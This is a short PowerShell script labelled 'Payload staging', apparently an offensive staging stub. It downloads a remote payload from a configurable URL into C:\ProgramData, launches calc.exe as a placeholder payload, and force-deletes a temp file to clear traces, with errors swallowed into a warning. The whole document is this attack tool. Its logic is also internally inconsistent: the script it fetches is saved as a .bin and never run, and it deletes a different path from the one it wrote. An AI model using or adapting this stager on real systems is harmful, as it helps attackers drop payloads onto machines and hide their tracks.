
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://internal.corp:8080/stage1.ps1',
    [string]$PayloadPath = "C:\ProgramData\stage2.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $PayloadPath); Start-Process -FilePath 'calc.exe'; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
